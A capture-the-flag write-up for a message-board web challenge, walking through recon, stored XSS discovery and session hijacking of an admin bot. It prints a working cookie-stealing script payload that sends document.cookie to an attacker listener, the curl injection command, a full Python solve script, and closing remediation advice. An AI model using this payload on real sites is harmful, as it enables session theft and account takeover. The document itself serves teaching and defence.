# Whispered Cookies

## Overview

We were given a public message board on port 8081 — a simple form (`username` + `message`) that posts to `/post` and renders messages back on the index. The challenge hint said:

> *"A public message board that renders whatever you feed it. Somewhere behind an admin-only endpoint sits the flag, but only privileged sessions ever see it. You'll need to convince a session to speak for you."*

The goal: reach an admin-only endpoint behind which the flag sits, using only a *privileged session* we don't have. Classic session-hijack-via-XSS setup.

---

## Recon

First pass with `curl`:

- **`GET /`** → HTML form. Two immediate tells:
  1. The messages are rendered as `<b>{username}</b>: {message}` — a candidate for reflected/stored XSS.
  2. A hidden comment: `<!--SYSTEM NOTE: handler reviews board activity periodically and visits with an active session -->` — there is an **admin bot** that loads the board with a privileged session.
- **`GET /robots.txt`** → 404, nothing there.
- Directory fuzzing with `ffuf` against `dirb/common.txt` surfaced a hidden route:

```bash
ffuf -u http://192.168.45.128:8081/FUZZ -w /usr/share/wordlists/dirb/common.txt -fc 404
# => /classified   [200]
```

- **`GET /classified`** → `ACCESS DENIED / INVALID SESSION TOKEN`. This is the admin-only endpoint.

So the flag is on `/classified`, guarded by a session token, and an admin bot with that token visits the board periodically.

---

## Analysis

**Vulnerability 1 — Stored XSS (missing output encoding).**
The `username` field is HTML-escaped on output (`&lt;script&gt;`), but the `message` body is emitted **raw**:

```html
<div class="msg"><b>abc</b>: <script>document.title='XSSED'</script></div>
```

So any `<script>` in the message executes for whoever loads the board — including the admin bot.

**Vulnerability 2 — static, guessable admin token in the cookie.**
`/classified` is gated only by a cookie (`nexus_session`), and the value turned out to be a hardcoded string rather than a signed, server-side session.

**The bot is not a real browser.** Probing it revealed its requests carry `User-Agent: python-requests/2.31.0` — it's a Python script, not headless Chrome. Testing three payloads pinned down its exact behaviour:

| Payload | Followed? |
|---|---|
| `<img src="http://attacker/…">` | ❌ ignored |
| `<a href="http://attacker/…">` | ❌ ignored |
| `<script>new Image().src='http://attacker/x?'+document.cookie</script>` | ✅ **visited**, cookie appended as `&c=<cookie>` |

So the "handler" simulates the classic cookie-exfil pattern: it finds `new Image().src='<url>'+document.cookie`, and GETs the URL with the *real* cookie value spliced in as an extra query param. (Notably it did **not** run `fetch()` or `encodeURIComponent()` for real — the `=` in the cookie stayed unencoded.) This is the exact lever the challenge expects us to pull: **convince the session (the bot) to speak for you (leak its cookie).**

---

## Exploitation

### Step 1 — stand up an exfil listener

(I used a tiny Python HTTP server on `192.168.45.1:8000`, which logs full paths).

### Step 2 — inject the payload so the bot leaks its cookie:

```bash
curl -s -X POST http://192.168.45.128:8081/post \
  --data-urlencode "username=reporter" \
  --data-urlencode "message=<script>new Image().src='http://192.168.45.1:8000/x?'+document.cookie</script>"
```

### Step 3 — wait for the handler to visit.

The listener captured:

```
GET /x?c=nexus_session=handler_token_9x7z   (User-Agent: python-requests/2.31.0)
```

**Step 4 — replay the stolen cookie** against `/classified`:

```bash
curl -s http://192.168.45.128:8081/classified \
  -H "Cookie: nexus_session=handler_token_9x7z"
```

```html
<h1>FILE W-01 RECOVERED</h1>
<p>FLAG: MAHASONA{session_hijacked_nexus_handler}</p>
```

### Complete solve script (stdlib only)

```python
# solve_whispered_cookies.py
import http.server, socketserver, threading, re, time
import urllib.request, urllib.parse

TARGET, ATTACKER, PORT = "http://192.168.45.128:8081", "192.168.45.1", 8000
leaked = {}

class Listener(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        m = re.search(r"[?&]c=([^&]+)", urllib.parse.unquote(self.path))
        if m and "nexus_session" in m.group(1):
            leaked["cookie"] = m.group(1)
        self.send_response(200); self.end_headers()
    def log_message(self, *a): pass

srv = socketserver.TCPServer(("0.0.0.0", PORT), Listener)
threading.Thread(target=srv.serve_forever, daemon=True).start()

payload = "<script>new Image().src='http://%s:%d/x?'+document.cookie</script>" % (ATTACKER, PORT)
urllib.request.urlopen(TARGET + "/post",
    data=urllib.parse.urlencode({"username": "agent", "message": payload}).encode())

for _ in range(120):
    if "cookie" in leaked: break
    time.sleep(1)

req = urllib.request.Request(TARGET + "/classified", headers={"Cookie": leaked["cookie"]})
html = urllib.request.urlopen(req).read().decode()
print(re.search(r"MAHASONA\{[^}]+\}", html).group(0))
```

---

## The Flag

```
MAHASONA{session_hijacked_nexus_handler}
```

Found in the HTTP response body of `/classified` after replaying the leaked `nexus_session` cookie.

---

## Remediation

**1. Escape all output — don't trust any field.**
The message body was emitted raw. Use Jinja2 auto-escaping for every user-supplied value (`{{ message }}`, not `{{ message|safe }}`), or an explicit context-appropriate encoder. The `username` field was already escaped, which proves the fix is trivial and was simply omitted on the message body.

**2. Don't put the admin credential in a predictable cookie.**
`nexus_session=handler_token_9x7z` is a static, guessable value. Use a **server-side** session (e.g. Flask's signed session or a session store) with a strong `SECRET_KEY`, random per-instance, and short expiry. Never gate a flag endpoint on a hardcoded token.

**3. Harden the cookie itself.**
Set `HttpOnly` (blocks `document.cookie` from JS) and `SameSite=Lax` (blocks cross-site request contexts). This directly breaks the exfil chain used here.

**4. Isolate the bot's privileges.**
The "handler" visited the board *with the same session that can read `/classified`*. Give the bot a reduced-privilege context (no flag-scoped session, or a separate sandboxed origin), so even a successful XSS against it can't reach the admin endpoint.

**5. Defense in depth — CSP.**
A `Content-Security-Policy` header disallowing inline script (`script-src 'self'`) would have neutralised the injected `<script>` entirely, since the payload was inline and non-allowlisted.
